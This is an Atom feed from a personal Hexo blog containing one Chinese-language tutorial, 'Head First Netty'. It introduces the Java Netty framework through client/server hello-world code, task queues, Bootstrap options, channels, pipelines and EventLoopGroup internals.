<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kayleh</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kayleh.top/"/>
  <updated>2021-05-27T07:14:13.493Z</updated>
  <id>https://kayleh.top/</id>
  
  <author>
    <name>Kayleh</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Head First Netty</title>
    <link href="https://kayleh.top/head-first-netty/"/>
    <id>https://kayleh.top/head-first-netty/</id>
    <published>2021-05-25T22:26:52.000Z</published>
    <updated>2021-05-27T07:14:13.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5Cb3fc6eb690464940b4a9b1100cfed5a2.png" alt="image.png"></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要讲述Netty框架的一些特性以及重要组件，希望看完之后能对Netty框架有一个比较直观的感受，希望能帮助读者快速入门Netty，减少一些弯路。</p><h1 id="一、Netty概述"><a href="#一、Netty概述" class="headerlink" title="一、Netty概述"></a>一、Netty概述</h1><p>官方的介绍：</p><blockquote><p>Netty is <em>an asynchronous event-driven network application framework</em><br>for rapid development of maintainable high performance protocol servers &amp; clients.</p></blockquote><p><strong>Netty</strong>是 一个<strong>异步事件驱动</strong>的网络应用程序框架，用于<strong>快速开发可维护的高性能协议服务器和客户端</strong>。</p><h1 id="二、为什么使用Netty"><a href="#二、为什么使用Netty" class="headerlink" title="二、为什么使用Netty"></a>二、为什么使用Netty</h1><p>从官网上介绍，Netty是一个网络应用程序框架，开发服务器和客户端。也就是用于网络编程的一个框架。既然是网络编程，Socket就不谈了，为什么不用NIO呢？</p><h2 id="2-1-NIO的缺点"><a href="#2-1-NIO的缺点" class="headerlink" title="2.1 NIO的缺点"></a>2.1 NIO的缺点</h2><p>对于这个问题，之前我写了一篇文章<a href="https://mp.weixin.qq.com/s/GfV9w2B0mbT7PmeBS45xLw" target="_blank" rel="noopener">《NIO入门》</a>对NIO有比较详细的介绍，NIO的主要问题是：</p><ul><li>NIO的类库和API繁杂，学习成本高，你需要熟练掌握Selector、ServerSocketChannel、SocketChannel、ByteBuffer等。</li><li>需要熟悉Java多线程编程。这是因为NIO编程涉及到Reactor模式，你必须对多线程和网络编程非常熟悉，才能写出高质量的NIO程序。</li><li>臭名昭著的epoll bug。它会导致Selector空轮询，最终导致CPU 100%。直到JDK1.7版本依然没得到根本性的解决。</li></ul><h2 id="2-2-Netty的优点"><a href="#2-2-Netty的优点" class="headerlink" title="2.2 Netty的优点"></a>2.2 Netty的优点</h2><p>相对地，Netty的优点有很多：</p><ul><li>API使用简单，学习成本低。</li><li>功能强大，内置了多种解码编码器，支持多种协议。</li><li>性能高，对比其他主流的NIO框架，Netty的性能最优。</li><li>社区活跃，发现BUG会及时修复，迭代版本周期短，不断加入新的功能。</li><li>Dubbo、Elasticsearch都采用了Netty，质量得到验证。</li></ul><h1 id="三、架构图"><a href="#三、架构图" class="headerlink" title="三、架构图"></a>三、架构图</h1><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C15944ade0142471399997efd68e52948.png" alt="image.png"></p><p>上面这张图就是在官网首页的架构图，我们从上到下分析一下。</p><blockquote><p>绿色的部分<strong>Core</strong>核心模块，包括零拷贝、API库、可扩展的事件模型。</p><p>橙色部分<strong>Protocol Support</strong>协议支持，包括Http协议、webSocket、SSL(安全套接字协议)、谷歌Protobuf协议、zlib/gzip压缩与解压缩、Large File Transfer大文件传输等等。</p><p>红色的部分<strong>Transport Services</strong>传输服务，包括Socket、Datagram、Http Tunnel等等。</p></blockquote><p>以上可看出Netty的功能、协议、传输方式都比较全，比较强大。</p><h1 id="四、永远的Hello-Word"><a href="#四、永远的Hello-Word" class="headerlink" title="四、永远的Hello Word"></a>四、永远的Hello Word</h1><p>首先搭建一个HelloWord工程，先熟悉一下API，还有为后面的学习做铺垫。以下面这张图为依据：</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5Ccc27d56addd74e82b6b6b349c7f3769b.png" alt="image.png"></p><h2 id="4-1-引入Maven依赖"><a href="#4-1-引入Maven依赖" class="headerlink" title="4.1 引入Maven依赖"></a>4.1 引入Maven依赖</h2><p>使用的版本是4.1.20，相对比较稳定的一个版本。</p><pre><code>&lt;dependency&gt;    &lt;groupId&gt;io.netty&lt;/groupId&gt;    &lt;artifactId&gt;netty-all&lt;/artifactId&gt;    &lt;version&gt;4.1.20.Final&lt;/version&gt;&lt;/dependency&gt;</code></pre><h2 id="4-2-创建服务端启动类"><a href="#4-2-创建服务端启动类" class="headerlink" title="4.2 创建服务端启动类"></a>4.2 创建服务端启动类</h2><pre><code>public class MyServer {    public static void main(String[] args) throws Exception {        //创建两个线程组 boosGroup、workerGroup        EventLoopGroup bossGroup = new NioEventLoopGroup();        EventLoopGroup workerGroup = new NioEventLoopGroup();        try {            //创建服务端的启动对象，设置参数            ServerBootstrap bootstrap = new ServerBootstrap();            //设置两个线程组boosGroup和workerGroup            bootstrap.group(bossGroup, workerGroup)                //设置服务端通道实现类型                    .channel(NioServerSocketChannel.class)                //设置线程队列得到连接个数                    .option(ChannelOption.SO_BACKLOG, 128)                //设置保持活动连接状态                    .childOption(ChannelOption.SO_KEEPALIVE, true)                //使用匿名内部类的形式初始化通道对象                    .childHandler(new ChannelInitializer&lt;SocketChannel&gt;() {                        @Override                        protected void initChannel(SocketChannel socketChannel) throws Exception {                            //给pipeline管道设置处理器                            socketChannel.pipeline().addLast(new MyServerHandler());                        }                    });//给workerGroup的EventLoop对应的管道设置处理器            System.out.println(&quot;java技术爱好者的服务端已经准备就绪...&quot;);            //绑定端口号，启动服务端            ChannelFuture channelFuture = bootstrap.bind(6666).sync();            //对关闭通道进行监听            channelFuture.channel().closeFuture().sync();        } finally {            bossGroup.shutdownGracefully();            workerGroup.shutdownGracefully();        }    }}</code></pre><h2 id="4-3-创建服务端处理器"><a href="#4-3-创建服务端处理器" class="headerlink" title="4.3 创建服务端处理器"></a>4.3 创建服务端处理器</h2><pre><code>/** * 自定义的Handler需要继承Netty规定好的HandlerAdapter * 才能被Netty框架所关联，有点类似SpringMVC的适配器模式 **/public class MyServerHandler extends ChannelInboundHandlerAdapter {    @Override    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {        //获取客户端发送过来的消息        ByteBuf byteBuf = (ByteBuf) msg;        System.out.println(&quot;收到客户端&quot; + ctx.channel().remoteAddress() + &quot;发送的消息：&quot; + byteBuf.toString(CharsetUtil.UTF_8));    }    @Override    public void channelReadComplete(ChannelHandlerContext ctx) throws Exception {        //发送消息给客户端        ctx.writeAndFlush(Unpooled.copiedBuffer(&quot;服务端已收到消息，并给你发送一个问号?&quot;, CharsetUtil.UTF_8));    }    @Override    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {        //发生异常，关闭通道        ctx.close();    }}</code></pre><h2 id="4-4-创建客户端启动类"><a href="#4-4-创建客户端启动类" class="headerlink" title="4.4 创建客户端启动类"></a>4.4 创建客户端启动类</h2><pre><code>public class MyClient {    public static void main(String[] args) throws Exception {        NioEventLoopGroup eventExecutors = new NioEventLoopGroup();        try {            //创建bootstrap对象，配置参数            Bootstrap bootstrap = new Bootstrap();            //设置线程组            bootstrap.group(eventExecutors)                //设置客户端的通道实现类型                    .channel(NioSocketChannel.class)                //使用匿名内部类初始化通道                .handler(new ChannelInitializer&lt;SocketChannel&gt;() {                        @Override                        protected void initChannel(SocketChannel ch) throws Exception {                            //添加客户端通道的处理器                            ch.pipeline().addLast(new MyClientHandler());                        }                    });            System.out.println(&quot;客户端准备就绪，随时可以起飞~&quot;);            //连接服务端            ChannelFuture channelFuture = bootstrap.connect(&quot;127.0.0.1&quot;, 6666).sync();            //对通道关闭进行监听            channelFuture.channel().closeFuture().sync();        } finally {            //关闭线程组            eventExecutors.shutdownGracefully();        }    }}</code></pre><h2 id="4-5-创建客户端处理器"><a href="#4-5-创建客户端处理器" class="headerlink" title="4.5 创建客户端处理器"></a>4.5 创建客户端处理器</h2><pre><code>public class MyClientHandler extends ChannelInboundHandlerAdapter {    @Override    public void channelActive(ChannelHandlerContext ctx) throws Exception {        //发送消息到服务端        ctx.writeAndFlush(Unpooled.copiedBuffer(&quot;歪比巴卜~茉莉~Are you good~马来西亚~&quot;, CharsetUtil.UTF_8));    }    @Override    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {        //接收服务端发送过来的消息        ByteBuf byteBuf = (ByteBuf) msg;        System.out.println(&quot;收到服务端&quot; + ctx.channel().remoteAddress() + &quot;的消息：&quot; + byteBuf.toString(CharsetUtil.UTF_8));    }}</code></pre><h2 id="4-6-测试"><a href="#4-6-测试" class="headerlink" title="4.6 测试"></a>4.6 测试</h2><p>先启动服务端，再启动客户端，就可以看到结果：</p><p>MyServer打印结果:</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C92908e107d6a487bb930ab6cd6be269f.png" alt="image.png"></p><p>MyClient打印结果：<br><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C419e8af300b24c9eaed71a76ddc2ddeb.png" alt="image.png"></p><h1 id="五、Netty的特性与重要组件"><a href="#五、Netty的特性与重要组件" class="headerlink" title="五、Netty的特性与重要组件"></a>五、Netty的特性与重要组件</h1><h2 id="5-1-taskQueue任务队列"><a href="#5-1-taskQueue任务队列" class="headerlink" title="5.1 taskQueue任务队列"></a>5.1 taskQueue任务队列</h2><p>如果Handler处理器有一些长时间的业务处理，可以交给<strong>taskQueue异步处理</strong>。怎么用呢，请看代码演示：</p><pre><code>public class MyServerHandler extends ChannelInboundHandlerAdapter {    @Override    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {        //获取到线程池eventLoop，添加线程，执行        ctx.channel().eventLoop().execute(new Runnable() {            @Override            public void run() {                try {                    //长时间操作，不至于长时间的业务操作导致Handler阻塞                    Thread.sleep(1000);                    System.out.println(&quot;长时间的业务处理&quot;);                } catch (Exception e) {                    e.printStackTrace();                }            }        });    }}</code></pre><p>我们打一个debug调试，是可以看到添加进去的taskQueue有一个任务。</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C23835a6ae2374897bf28a0b70fce9cc8.png" alt="image.png"></p><h2 id="5-2-scheduleTaskQueue延时任务队列"><a href="#5-2-scheduleTaskQueue延时任务队列" class="headerlink" title="5.2 scheduleTaskQueue延时任务队列"></a>5.2 scheduleTaskQueue延时任务队列</h2><p>延时任务队列和上面介绍的任务队列非常相似，只是多了一个可延迟一定时间再执行的设置，请看代码演示：</p><pre><code>ctx.channel().eventLoop().schedule(new Runnable() {    @Override    public void run() {        try {            //长时间操作，不至于长时间的业务操作导致Handler阻塞            Thread.sleep(1000);            System.out.println(&quot;长时间的业务处理&quot;);        } catch (Exception e) {            e.printStackTrace();        }    }},5, TimeUnit.SECONDS);//5秒后执行</code></pre><p>依然打开debug进行调试查看，我们可以有一个scheduleTaskQueue任务待执行中</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C173194f21adfa111" alt="img"></p><h2 id="5-3-Future异步机制"><a href="#5-3-Future异步机制" class="headerlink" title="5.3 Future异步机制"></a>5.3 Future异步机制</h2><p>在搭建HelloWord工程的时候，我们看到有一行这样的代码：</p><pre><code>ChannelFuture channelFuture = bootstrap.connect(&quot;127.0.0.1&quot;, 6666);</code></pre><p>很多操作都返回这个ChannelFuture对象，究竟这个ChannelFuture对象是用来做什么的呢？</p><p>ChannelFuture提供操作完成时一种异步通知的方式。一般在Socket编程中，等待响应结果都是同步阻塞的，而Netty则不会造成阻塞，因为ChannelFuture是采取类似观察者模式的形式进行获取结果。请看一段代码演示：</p><pre><code>//添加监听器channelFuture.addListener(new ChannelFutureListener() {    //使用匿名内部类，ChannelFutureListener接口    //重写operationComplete方法    @Override    public void operationComplete(ChannelFuture future) throws Exception {        //判断是否操作成功            if (future.isSuccess()) {            System.out.println(&quot;连接成功&quot;);        } else {            System.out.println(&quot;连接失败&quot;);        }    }});</code></pre><h2 id="5-4-Bootstrap与ServerBootStrap"><a href="#5-4-Bootstrap与ServerBootStrap" class="headerlink" title="5.4 Bootstrap与ServerBootStrap"></a>5.4 Bootstrap与ServerBootStrap</h2><p>Bootstrap和ServerBootStrap是Netty提供的一个创建客户端和服务端启动器的工厂类，使用这个工厂类非常便利地创建启动类，根据上面的一些例子，其实也看得出来能大大地减少了开发的难度。首先看一个类图：</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C40cf762660d9455eb6066119cf5eeb49.png" alt="image.png"></p><p>可以看出都是继承于AbstractBootStrap抽象类，所以大致上的配置方法都相同。</p><p>一般来说，使用Bootstrap创建启动器的步骤可分为以下几步：</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5Cae5c6ed3008d4323aaa817e9cb46437a.png" alt="image.png"></p><h3 id="5-4-1-group"><a href="#5-4-1-group" class="headerlink" title="5.4.1 group()"></a>5.4.1 group()</h3><p>在上一篇文章<a href="https://mp.weixin.qq.com/s/vWbbn1qXRFVva8Y9yET18Q" target="_blank" rel="noopener">《Reactor模式》</a>中，我们就讲过服务端要使用两个线程组：</p><ul><li>bossGroup 用于监听客户端连接，专门负责与客户端创建连接，并把连接注册到workerGroup的Selector中。</li><li>workerGroup用于处理每一个连接发生的读写事件。</li></ul><p>一般创建线程组直接使用以下new就完事了：</p><pre><code>EventLoopGroup bossGroup = new NioEventLoopGroup();EventLoopGroup workerGroup = new NioEventLoopGroup();</code></pre><p>有点好奇的是，既然是线程组，那线程数默认是多少呢？深入源码：</p><pre><code>    //使用一个常量保存    private static final int DEFAULT_EVENT_LOOP_THREADS;    static {        //NettyRuntime.availableProcessors() * 2，cpu核数的两倍赋值给常量        DEFAULT_EVENT_LOOP_THREADS = Math.max(1, SystemPropertyUtil.getInt(                &quot;io.netty.eventLoopThreads&quot;, NettyRuntime.availableProcessors() * 2));        if (logger.isDebugEnabled()) {            logger.debug(&quot;-Dio.netty.eventLoopThreads: {}&quot;, DEFAULT_EVENT_LOOP_THREADS);        }    }    protected MultithreadEventLoopGroup(int nThreads, Executor executor, Object... args) {        //如果不传入，则使用常量的值，也就是cpu核数的两倍        super(nThreads == 0 ? DEFAULT_EVENT_LOOP_THREADS : nThreads, executor, args);    }</code></pre><p>通过源码可以看到，默认的线程数是cpu核数的两倍。假设想自定义线程数，可以使用有参构造器：</p><pre><code>//设置bossGroup线程数为1EventLoopGroup bossGroup = new NioEventLoopGroup(1);//设置workerGroup线程数为16EventLoopGroup workerGroup = new NioEventLoopGroup(16);</code></pre><h3 id="5-4-2-channel"><a href="#5-4-2-channel" class="headerlink" title="5.4.2 channel()"></a>5.4.2 channel()</h3><p>这个方法用于设置通道类型，当建立连接后，会根据这个设置创建对应的Channel实例。</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C1731951ae3c43228" alt="img"></p><p>使用debug模式可以看到</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C1731951f80b07785" alt="img"></p><p>通道类型有以下：</p><p><strong>NioSocketChannel</strong>： 异步非阻塞的客户端 TCP Socket 连接。</p><p><strong>NioServerSocketChannel</strong>： 异步非阻塞的服务器端 TCP Socket 连接。</p><blockquote><p>常用的就是这两个通道类型，因为是异步非阻塞的。所以是首选。</p></blockquote><p>OioSocketChannel： 同步阻塞的客户端 TCP Socket 连接。</p><p>OioServerSocketChannel： 同步阻塞的服务器端 TCP Socket 连接。</p><blockquote><p>稍微在本地调试过，用起来和Nio有一些不同，是阻塞的，所以API调用也不一样。因为是阻塞的IO，几乎没什么人会选择使用Oio，所以也很难找到例子。我稍微琢磨了一下，经过几次报错之后，总算调通了。代码如下：</p></blockquote><pre><code>//server端代码，跟上面几乎一样，只需改三个地方//这个地方使用的是OioEventLoopGroupEventLoopGroup bossGroup = new OioEventLoopGroup();ServerBootstrap bootstrap = new ServerBootstrap();bootstrap.group(bossGroup)//只需要设置一个线程组boosGroup        .channel(OioServerSocketChannel.class)//设置服务端通道实现类型//client端代码，只需改两个地方//使用的是OioEventLoopGroupEventLoopGroup eventExecutors = new OioEventLoopGroup();//通道类型设置为OioSocketChannelbootstrap.group(eventExecutors)//设置线程组        .channel(OioSocketChannel.class)//设置客户端的通道实现类型</code></pre><p>NioSctpChannel： 异步的客户端 Sctp（Stream Control Transmission Protocol，流控制传输协议）连接。</p><p>NioSctpServerChannel： 异步的 Sctp 服务器端连接。</p><blockquote><p>本地没启动成功，网上看了一些网友的评论，说是只能在linux环境下才可以启动。从报错信息看：SCTP not supported on this platform，不支持这个平台。因为我电脑是window系统，所以网友说的有点道理。</p></blockquote><h3 id="5-4-3-option-与childOption"><a href="#5-4-3-option-与childOption" class="headerlink" title="5.4.3 option()与childOption()"></a>5.4.3 option()与childOption()</h3><p>首先说一下这两个的区别。</p><p>option()设置的是服务端用于接收进来的连接，也就是boosGroup线程。</p><p>childOption()是提供给父管道接收到的连接，也就是workerGroup线程。</p><p>搞清楚了之后，我们看一下常用的一些设置有哪些：</p><p>SocketChannel参数，也就是childOption()常用的参数：</p><blockquote><p><strong>SO_RCVBUF</strong> Socket参数，TCP数据接收缓冲区大小。<br><strong>TCP_NODELAY</strong> TCP参数，立即发送数据，默认值为Ture。<br><strong>SO_KEEPALIVE</strong> Socket参数，连接保活，默认值为False。启用该功能时，TCP会主动探测空闲连接的有效性。</p></blockquote><p>ServerSocketChannel参数，也就是option()常用参数：</p><blockquote><p><strong>SO_BACKLOG</strong> Socket参数，服务端接受连接的队列长度，如果队列已满，客户端连接将被拒绝。默认值，Windows为200，其他为128。</p></blockquote><p>由于篇幅限制，其他就不列举了，大家可以去网上找资料看看，了解一下。</p><h3 id="5-4-4-设置流水线-重点"><a href="#5-4-4-设置流水线-重点" class="headerlink" title="5.4.4 设置流水线(重点)"></a>5.4.4 设置流水线(重点)</h3><p>ChannelPipeline是Netty处理请求的责任链，ChannelHandler则是具体处理请求的处理器。实际上每一个channel都有一个处理器的流水线。</p><p>在Bootstrap中childHandler()方法需要初始化通道，实例化一个ChannelInitializer，这时候需要重写initChannel()初始化通道的方法，装配流水线就是在这个地方进行。代码演示如下：</p><pre><code>//使用匿名内部类的形式初始化通道对象bootstrap.childHandler(new ChannelInitializer&lt;SocketChannel&gt;() {    @Override    protected void initChannel(SocketChannel socketChannel) throws Exception {        //给pipeline管道设置自定义的处理器        socketChannel.pipeline().addLast(new MyServerHandler());    }});</code></pre><p>处理器Handler主要分为两种：</p><blockquote><p>ChannelInboundHandlerAdapter(入站处理器)、ChannelOutboundHandler(出站处理器)</p></blockquote><p>入站指的是数据从底层java NIO Channel到Netty的Channel。</p><p>出站指的是通过Netty的Channel来操作底层的java NIO Channel。</p><p><strong>ChannelInboundHandlerAdapter处理器常用的事件有</strong>：</p><ol><li>注册事件 fireChannelRegistered。</li><li>连接建立事件 fireChannelActive。</li><li>读事件和读完成事件 fireChannelRead、fireChannelReadComplete。</li><li>异常通知事件 fireExceptionCaught。</li><li>用户自定义事件 fireUserEventTriggered。</li><li>Channel 可写状态变化事件 fireChannelWritabilityChanged。</li><li>连接关闭事件 fireChannelInactive。</li></ol><p><strong>ChannelOutboundHandler处理器常用的事件有</strong>：</p><ol><li>端口绑定 bind。</li><li>连接服务端 connect。</li><li>写事件 write。</li><li>刷新时间 flush。</li><li>读事件 read。</li><li>主动断开连接 disconnect。</li><li>关闭 channel 事件 close。</li></ol><blockquote><p>还有一个类似的handler()，主要用于装配parent通道，也就是bossGroup线程。一般情况下，都用不上这个方法。</p></blockquote><h3 id="5-4-5-bind"><a href="#5-4-5-bind" class="headerlink" title="5.4.5 bind()"></a>5.4.5 bind()</h3><p>提供用于服务端或者客户端绑定服务器地址和端口号，默认是异步启动。如果加上sync()方法则是同步。</p><p>有五个同名的重载方法，作用都是用于绑定地址端口号。不一一介绍了。</p><h3 id="5-4-6-优雅地关闭EventLoopGroup"><a href="#5-4-6-优雅地关闭EventLoopGroup" class="headerlink" title="5.4.6 优雅地关闭EventLoopGroup"></a>5.4.6 优雅地关闭EventLoopGroup</h3><pre><code>//释放掉所有的资源，包括创建的线程bossGroup.shutdownGracefully();workerGroup.shutdownGracefully();</code></pre><p>会关闭所有的child Channel。关闭之后，释放掉底层的资源。</p><h2 id="5-5-Channel"><a href="#5-5-Channel" class="headerlink" title="5.5 Channel"></a>5.5 Channel</h2><p>Channel是什么？不妨看一下官方文档的说明：</p><blockquote><p>A nexus to a network socket or a component which is capable of I/O operations such as read, write, connect, and bind</p></blockquote><p>翻译大意：一种连接到网络套接字或能进行读、写、连接和绑定等I/O操作的组件。</p><p>如果上面这段说明比较抽象，下面还有一段说明：</p><blockquote><p>A channel provides a user:</p><p>the current state of the channel (e.g. is it open? is it connected?),<br>the configuration parameters of the channel (e.g. receive buffer size),<br>the I/O operations that the channel supports (e.g. read, write, connect, and bind), and<br>the ChannelPipeline which handles all I/O events and requests associated with the channel.</p></blockquote><p>翻译大意：</p><p>channel为用户提供：</p><ol><li>通道当前的状态（例如它是打开？还是已连接？）</li><li>channel的配置参数（例如接收缓冲区的大小）</li><li>channel支持的IO操作（例如读、写、连接和绑定），以及处理与channel相关联的所有IO事件和请求的ChannelPipeline。</li></ol><h3 id="5-5-1-获取channel的状态"><a href="#5-5-1-获取channel的状态" class="headerlink" title="5.5.1 获取channel的状态"></a>5.5.1 获取channel的状态</h3><pre><code>boolean isOpen(); //如果通道打开，则返回trueboolean isRegistered();//如果通道注册到EventLoop，则返回trueboolean isActive();//如果通道处于活动状态并且已连接，则返回trueboolean isWritable();//当且仅当I/O线程将立即执行请求的写入操作时，返回true。</code></pre><p>以上就是获取channel的四种状态的方法。</p><h3 id="5-5-2-获取channel的配置参数"><a href="#5-5-2-获取channel的配置参数" class="headerlink" title="5.5.2 获取channel的配置参数"></a>5.5.2 获取channel的配置参数</h3><p>获取单条配置信息，使用getOption()，代码演示：</p><pre><code>ChannelConfig config = channel.config();//获取配置参数//获取ChannelOption.SO_BACKLOG参数,Integer soBackLogConfig = config.getOption(ChannelOption.SO_BACKLOG);//因为我启动器配置的是128，所以我这里获取的soBackLogConfig=128</code></pre><p>获取多条配置信息，使用getOptions()，代码演示：</p><pre><code>ChannelConfig config = channel.config();Map&lt;ChannelOption&lt;?&gt;, Object&gt; options = config.getOptions();for (Map.Entry&lt;ChannelOption&lt;?&gt;, Object&gt; entry : options.entrySet()) {    System.out.println(entry.getKey() + &quot; : &quot; + entry.getValue());}/**SO_REUSEADDR : falseWRITE_BUFFER_LOW_WATER_MARK : 32768WRITE_BUFFER_WATER_MARK : WriteBufferWaterMark(low: 32768, high: 65536)SO_BACKLOG : 128以下省略...*/</code></pre><h3 id="5-5-3-channel支持的IO操作"><a href="#5-5-3-channel支持的IO操作" class="headerlink" title="5.5.3 channel支持的IO操作"></a>5.5.3 channel支持的IO操作</h3><p><strong>写操作</strong>，这里演示从服务端写消息发送到客户端：</p><pre><code>@Overridepublic void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {    ctx.channel().writeAndFlush(Unpooled.copiedBuffer(&quot;这波啊，这波是肉蛋葱鸡~&quot;, CharsetUtil.UTF_8));}</code></pre><p>客户端控制台：</p><pre><code>//收到服务端/127.0.0.1:6666的消息：这波啊，这波是肉蛋葱鸡~</code></pre><p><strong>连接</strong>操作，代码演示：</p><pre><code>ChannelFuture connect = channelFuture.channel().connect(new InetSocketAddress(&quot;127.0.0.1&quot;, 6666));//一般使用启动器，这种方式不常用</code></pre><p><strong>通过channel获取ChannelPipeline</strong>，并做相关的处理：</p><pre><code>//获取ChannelPipeline对象ChannelPipeline pipeline = ctx.channel().pipeline();//往pipeline中添加ChannelHandler处理器，装配流水线pipeline.addLast(new MyServerHandler());</code></pre><h2 id="5-6-Selector"><a href="#5-6-Selector" class="headerlink" title="5.6 Selector"></a>5.6 Selector</h2><p>在NioEventLoop中，有一个成员变量selector，这是nio包的Selector，在之前<a href="https://mp.weixin.qq.com/s/GfV9w2B0mbT7PmeBS45xLw" target="_blank" rel="noopener">《NIO入门》</a>中，我已经讲过Selector了。</p><p>Netty中的Selector也和NIO的Selector是一样的，就是用于监听事件，管理注册到Selector中的channel，实现多路复用器。</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C5fa70ed04e234fad9e524b3766051c4a.png" alt="image.png"></p><h2 id="5-7-PiPeline与ChannelPipeline"><a href="#5-7-PiPeline与ChannelPipeline" class="headerlink" title="5.7 PiPeline与ChannelPipeline"></a>5.7 PiPeline与ChannelPipeline</h2><p>在前面介绍Channel时，我们知道可以在channel中装配ChannelHandler流水线处理器，那一个channel不可能只有一个channelHandler处理器，肯定是有很多的，既然是很多channelHandler在一个流水线工作，肯定是有顺序的。</p><p>于是pipeline就出现了，pipeline相当于处理器的容器。初始化channel时，把channelHandler按顺序装在pipeline中，就可以实现按序执行channelHandler了。</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5Ce7bac501d86e4e75a897686d7bab40fe.png" alt="image.png"></p><p>在一个Channel中，只有一个ChannelPipeline。该pipeline在Channel被创建的时候创建。ChannelPipeline包含了一个ChannelHander形成的列表，且所有ChannelHandler都会注册到ChannelPipeline中。</p><h2 id="5-8-ChannelHandlerContext"><a href="#5-8-ChannelHandlerContext" class="headerlink" title="5.8 ChannelHandlerContext"></a>5.8 ChannelHandlerContext</h2><p>在Netty中，Handler处理器是有我们定义的，上面讲过通过集成入站处理器或者出站处理器实现。这时如果我们想在Handler中获取pipeline对象，或者channel对象，怎么获取呢。</p><p>于是Netty设计了这个ChannelHandlerContext上下文对象，就可以拿到channel、pipeline等对象，就可以进行读写等操作。</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C4c6e9319213b489bbfcc2d7697cf03b0.png" alt="image.png"></p><p>通过类图，ChannelHandlerContext是一个接口，下面有三个实现类。</p><p>实际上ChannelHandlerContext在pipeline中是一个链表的形式。看一段源码就明白了：</p><pre><code>//ChannelPipeline实现类DefaultChannelPipeline的构造器方法protected DefaultChannelPipeline(Channel channel) {    this.channel = ObjectUtil.checkNotNull(channel, &quot;channel&quot;);    succeededFuture = new SucceededChannelFuture(channel, null);    voidPromise =  new VoidChannelPromise(channel, true);    //设置头结点head，尾结点tail    tail = new TailContext(this);    head = new HeadContext(this);    head.next = tail;    tail.prev = head;}</code></pre><p>下面我用一张图来表示，会更加清晰一点：<br><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5Cc77ea0ea4e554d65b61ee0a2eae78a0c.png" alt="image.png"></p><h2 id="5-9-EventLoopGroup"><a href="#5-9-EventLoopGroup" class="headerlink" title="5.9 EventLoopGroup"></a>5.9 EventLoopGroup</h2><p>我们先看一下EventLoopGroup的类图：</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C7a95eeb933be4470acdc5f0f07afbc2a.png" alt="image.png"></p><p>其中包括了常用的实现类NioEventLoopGroup。OioEventLoopGroup在前面的例子中也有使用过。</p><p>从Netty的架构图中，可以知道服务器是需要两个线程组进行配合工作的，而这个线程组的接口就是EventLoopGroup。</p><p>每个EventLoopGroup里包括一个或多个EventLoop，每个EventLoop中维护一个Selector实例。</p><h3 id="5-9-1-轮询机制的实现原理"><a href="#5-9-1-轮询机制的实现原理" class="headerlink" title="5.9.1 轮询机制的实现原理"></a>5.9.1 轮询机制的实现原理</h3><p>我们不妨看一段DefaultEventExecutorChooserFactory的源码：</p><pre><code>private final AtomicInteger idx = new AtomicInteger();private final EventExecutor[] executors;@Overridepublic EventExecutor next() {    //idx.getAndIncrement()相当于idx++，然后对任务长度取模    return executors[idx.getAndIncrement() &amp; executors.length - 1];}</code></pre><p>这段代码可以确定执行的方式是轮询机制，接下来debug调试一下：</p><p><img src="/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Chead-first-netty%5C17319554d4546047" alt="img"></p><p>它这里还有一个判断，如果线程数不是2的N次方，则采用取模算法实现。</p><pre><code>@Overridepublic EventExecutor next() {    return executors[Math.abs(idx.getAndIncrement() % executors.length)];}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
